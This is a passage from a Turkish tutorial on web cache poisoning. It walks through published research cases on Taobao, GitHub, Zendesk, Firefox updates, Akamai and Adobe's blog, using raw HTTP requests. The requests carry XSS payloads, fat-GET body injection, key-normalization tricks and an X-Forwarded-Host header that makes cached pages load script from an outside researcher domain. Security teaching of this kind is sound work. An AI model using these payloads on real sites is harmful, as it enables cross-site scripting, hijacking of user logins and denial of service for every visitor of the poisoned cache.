Parametreleri önbellek anahtarından gizlemenin başka bir yolu da basitçe bir `POST` isteği göndermektir. Bazı sistemler HTTP istek metodunu önbellek anahtarına dahil etmez. Yani `POST` veya `GET` olup olmadığına bakmaksızın önbellekleme yapabilir. 

```bash
POST /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com

_wvUserWkWebView=a</script><svg onload='alert%26lpar;1%26rpar;'/data-
```

```bash
HTTP/1.1 200 OK
…
"_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
```

Artık standart bir kullanıcı `GET` ile ***/view/o2o/shop*** adresini ziyaret ettiğinde önbellekten zararlı yükün bulunduğu yanıt döndürülecektir.

```bash
GET /view/o2o/shop HTTP/1.1
Host: alijk.m.taobao.com
```

```bash
HTTP/1.1 200 OK
…
"_wvUseWKWebView":"a</script><svg onload='alert&lpar;1&rpar;'/data-"},
```

### Fat GET

Bazı sistemler `GET` isteğiyle birlikte body kısmında yer alan verileri de alırlar. Yani `GET` isteğinin `POST` gibi ele alındığı hatalı yaklaşımlar mevcut olabilir. 

Örneğin aşağıdaki isteği gönderdiğimizde, albinowax github sayfasını ziyaret edip bu kullanıcıyı kötüye kullanım şeklinde bildiren tüm kullanıcılar aslında “innocent-victim” yani başka hedef kullanıcıyı raporlamış olacaklar.

```bash
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

`GET` isteğindeki body kısmı önbelleğe alındığı için istekleri zehirlemek mümkün hale geliyor. 

Bir diğer örnek olarak, zendesk kullanan bir hedef için aşağıdaki istek; onların giriş sayfalarını önbellek ile zehirleyecek, böylece kendi kimlik bilgilerini giren ve 'login’i tıklayan herkes, onları benim hesabımda oturum açmış halde bırakan bir yönlendirme zincirinden geçirilecek ve daha sonra oluşturdukları tüm biletlerin yetkisi bana verilecek:

```bash
GET /en-us/signin HTTP/1.1
Host: example.zendesk.com

return_to=/access/logout?return_to=/./access/return_to?flash_digest=secret-token%2526return_to=/final-page?foo=foo%252526bar=bar
```

```bash
HTTP/1.1 200 OK
…
<input name="return_to" value="/access/logout?return_to=/./access/return_to…">
```

## Özellikleri ve Bileşenleri Kötüye Kullanma

Önbellek zehirleme saldırılarının etkisi büyük ölçüde mevcut **gadget**'lara (saldırganın manipüle edebileceği ve zararlı eylemler gerçekleştirebileceği kod parçaları veya bileşenler) bağlıdır. Şimdi bu “gadget” ların neler olabileceği ve nasıl kötüye kullanılabilceklerinden bahsederek devam edelim.

### Kaynak Dosyalar: JS ve CSS

JS ve CSS gibi kaynak dosyalar genellikle statiktir, ancak bazen sorgu dizisinden (query string) gelen girdileri yansıtırlar. Bu genellikle zararsızdır çünkü tarayıcılar bu dosyaları doğrudan görüntülendiğinde çalıştırmaz, ancak önbellek zehirleme saldırıları için mükemmel gadget'lar oluştururlar. Önbellek zehirleme kullanarak bir kaynak dosyaya içerik enjekte edebilirsek, o kaynağı yükleyen her sayfa üzerinde, hatta bağlantılı diğer domainler üzerinde bile kontrol elde ederiz. Örneğin, 'import' kuralının mevcut sorgu dizisini yansıttığı bir örnek:

```bash
GET /style.css?x=a);@import... HTTP/1.1
```

```bash
HTTP/1.1 200 OK

@import url(/site/home/index-part1.8a6715a2.css?x=a);@import...
```

Bu, zararlı CSS enjekte etmek ve bu CSS dosyasını yükleyen herhangi bir sayfadan hassas bilgileri sızdırmak için kullanılabilir.

Hatta eğer CSS dosyasını yükleyen sayfada bir doctype yoksa, dosyanın text/css içerik türüne sahip olması bile gerekmez; tarayıcılar geçerli CSS ile karşılaşana kadar belgeyi tarar ve ardından bunu çalıştırır. Bu, ara sıra statik CSS dosyalarını, bir sunucu hatasını tetikleyerek URL'yi yansıtan şekilde zehirleyebileceğiniz anlamına gelir:

```bash
GET /foo.css?x=alert(1)%0A{}*{color:red;} HTTP/1.1
```

```bash
HTTP/1.1 200 OK
Content-Type: text/html

This request was blocked due to… alert(1)
 {}*{color:red;}
```

Bu istek, geçerli CSS içeren bir sunucu hatası yansıttığında tarayıcı tarafından yürütülebilir.

## Önbellek Anahtarının Normalizasyonu

Önbellek anahtarı normalizasyonu gibi basit bir işlem bile ciddi sonuçlara yol açabilir. Bu durumu Firefox'un güncelleme sistemi üzerinden inceleyelim. Firefox, periyodik olarak tarayıcı güncellemelerini kontrol etmek için şu isteği yapar:

```bash
GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```

Yanıt ise şu şekildedir:

```bash
HTTP/1.1 301 Found
Location: https://download-installer.cdn.mozilla.net/pub/..firefox-73.mar
```

Soruna sebep olan sunucu yapılandırması aşağıdaki şekildeymiş:

```bash
server {
    proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;
    location / {
        proxy_pass http://upstream_bouncer;
    }
}
```

Bu yapılandırmada `proxy_cache_key` ayarında herhangi bir sorun yok; aslında, nginx'in varsayılan cache key'ine oldukça benzer. Ancak, nginx'in `proxy_pass` belgesine [baktığınızda](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass) sorunun ipucunu bulabilirsiniz:

<p class="yesil">If proxy_pass is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed.</p>

Buradaki '**in the same form**' (aynı biçimde) ifadesi, iletilen isteğin normalize edilmeyeceğini, oysa cache key'de saklanan istek bileşenlerinin normalleştirilebileceğini ima eder. Nginx'in cache key'e uyguladığı normalizasyon biçimlerinden biri, tam URL-çözümleme (URL-decode) işlemidir.

### Saldırının İşleyişi

Eğer güncelleme isteğini URL encode şeklindeki soru işareti ile yaparsanız, bu backend tarafında karışıklığa neden olacak ve hatalı bir yönlendirme(hatalı istekleri doğrudan ana sayfaya yönlendiriyor) ile sonuçlanacaktır:

```bash
GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```

```bash
HTTP/1.1 301 Found
Location: https://www.mozilla.org/
```

Ancak, nginx'in URL-çözümleme işlemi sayesinde `?` ve `%3` aynı cache key değerine tekabül edeceği için bu istek, meşru bir güncelleme isteği ile aynı cache key'e sahip olacaktır. Bu noktadan itibaren, Firefox global olarak güncelleme yapamayacaktır:

```bash
GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```

```bash
HTTP/1.1 301 Found
Location: https://www.mozilla.org/
```

## Önbellek Sihirbazlıkları

### Encoded XSS

Burp repeater sekmesinde aşağıdaki gibi bir istek gönderdiğinizde reflected XSS elde edilebildiğini düşündüğünüz bir durum olduğunu varsayalım:

```bash
GET /?x="/><script>alert(1)</script> HTTP/1.1
Host: example.com
```

```bash
HTTP/1.1 200 OK
...
<a href="/?x="/><script>alert(1)</script>
```

Fakat bu açığı standart web tarayıcıları üzerinde uygulayamazsınız. Çünkü modern tarayıcılar, sunucuya istekte bulunmadan önce anahtar karakterleri URL olarak kodlar ve sunucu bunların kodunu çözmez. Yani aslında sunucu tarafına aşağıdaki gibi bir istek gönderilir:

```bash
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com
```

Sunucu da URL decode uygulamadan bunu yanıta yansıtır:

```bash
HTTP/1.1 200 OK
...
<a href="/?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
```

Benzer şekilde aslında yalnızca path yolundaki karakterleri değil, query yani sorgu dizesindeki temel karakteri de tarayıcılar URL olarak kodlayıp sunucuya iletiyor.

Fakat önbellek anahtarlarının normalize edilmesi sayesinde daha önceki örnekte de gördüğümüz şekilde aslında URL encode ve standart karakterler de aynı önbellek anahtarına dönüştürülüyor. Bu sayede biz öncelikle burp üzerinden URL encode olmayan isteği gönderip bunu önbelleğe almayı başarabilirsek, URL encode biçimindeki standart tarayıcılardan gelen isteklere de bu önbellekten yanıt döndürülüyor olacak.

Öncelikle burp ile isteği URL encode olmadan sunucuya iletip önbelleğe bu şekilde alınmasını sağlayalım:

```bash
GET /?x="/><script>alert(1)</script> HTTP/1.1
Host: example.com
```

```bash
HTTP/1.1 200 OK
...
<a href="/?x="/><script>alert(1)</script>
```

Tamamdır, şimdi standart tarayıcılar üzerinden bu url ziyaret edildiğinde URL encode uygulansa bile önbellek mekanizması URL normalizasyonu ile her iki isteği de aynı görüp, önceden oluşturduğu önbellekten yanıtı dönecek.

```bash
GET /?x=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com
```

```bash
HTTP/1.1 200 OK
X-Cache: HIT
...
<a href="/?x="/><script>alert(1)</script>
```

### Önbellek Anahtarı Enjeksiyonu - Akamai

Örneğin `Origin` başlığı gibi normalde standart kullanıcıların göndermeyeceği başlıklar üzerinden sömürü gerçekleştirmemiz gerekirse ? 

```bash
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'
```

```bash
HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'

<script>…'-alert(1)-'…</script>
```

Normalde bu tür bir açığı sömürmek mümkün değildir, çünkü standart kullanıcıların tarayıcıları üzerinden `Origin: '-alert(1)-'` başlığı ile istek göndermesini sağlayamazsınız. Fakat Akamai tüm anahtar bileşenleri birbirinden ayıran `__` kaçış karakterlerini kaldırmadan önbellek anahtarına dahil ederse, aşağıdaki iki istek de aynı önbellek anahtarına sahip olabilir.

**İlk İstek:**

```bash
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__
```

```bash
HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
```

**İkinci istek:**

```bash
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
```

```bash
HTTP/1.1 200 OK
X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
X-Cache: TCP_HIT

<script>…'-alert(1)-'…</script>
```

İlk isteği kendiniz yaparak ve kurbanınızı ikinci URL'ye yönlendirerek bu XSS'yi sömürülebilir hale getirmiş olursunuz. Çünkü ilk istek ile `Origin` başlığının önbelleğe alınmasını sağlarsınız. İkinci istekte ise `__` ayrıştırma karakteri kaldırılmadan önbelleğe alındığı için, önbellek mekanizmasını kandırarak bir önceki istek neticesinde oluşturan önbellek anahtarı ile mevcut isteğin aynı olması sağlanmış olur. 

## Dahili Önbellek Zehirlenmesi

Önbellek zehirlemesi saldırıları genellikle karmaşık ve dikkatle yürütülmesi gereken işlemler olsa da, bazıları o kadar pratiktir ki güvenli bir şekilde gerçekleştirilmeleri neredeyse imkansızdır. İşte Adobe'nin blogunda yaşanan bir örnek vaka:

**İstek:**

```bash
GET /access-the-power-of-adobe-acrobat?dontpoisoneveryone=1 HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: collaborator-id.psres.net
```

Bu istekten sonra, araştırmacının Burp Collaborator sunucusuna, Adobe'nin web sitesinin her yerinden gelen yoğun bir trafik akışı oluşmuş. İncelendiğinde, Adobe'nin WP Rocket Cache adında entegre bir uygulama düzeyinde önbellek kullandığı ortaya çıkmış. Uygulama düzeyindeki dahili önbellekler, yanıtların parçalarını ayrı ayrı önbelleğe alır ve genellikle bir önbellek anahtarı kavramına sahip değildir.

**Sonuç:**

```bash
GET / HTTP/1.1
Host: theblog.adobe.com
```

```bash
HTTP/1.1 200 OK
X-Cache: HIT - WP Rocket Cache
...
<script src="https://collaborator-id.psres.net/foo.js"/>
...
<a href="https://collaborator-id.psres.net/post">…
```

Bu istekle, sitenin ana sayfası dahil her sayfa zehirlenmiş ve her bağlantı araştırmacının alan adıma yönlendirilmiş. Bu durum, sitenin neredeyse tamamen araştırmacının domainine bağımlı hale gelmesine neden olmuş.

Böylelikle önbellek zehirlenmesi konusu pek çok açıdan ele almış olduk. Bu yazı içeriğinin tamamı aşağıdaki kaynaklar sayesinde mümkün olmuştur. Dolayısıyla birincil kaynaklardan daha detaylı bilgi edinmek için göz atın lütfen.

Burada edindiğiniz pratikleri [lablar](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws) üzerinden test ederek öğrenme düzeyinizi de görebilirsiniz.

## İleri Okuma

Tüm anlatımlar benim anlayışım ile sınırlı olduğu için daha kesin ve detaylı bilgileri edinmek için lütfen kaynakları inceleyin.

- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Bypassing Web Cache Poisoning Countermeasures](https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Next.js and Cache Poisoning: A Quest for the Black Hole](https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole)
- [DoS via Cache Poisoning](https://zhero-web-sec.github.io/dos-via-cache-poisoning/)
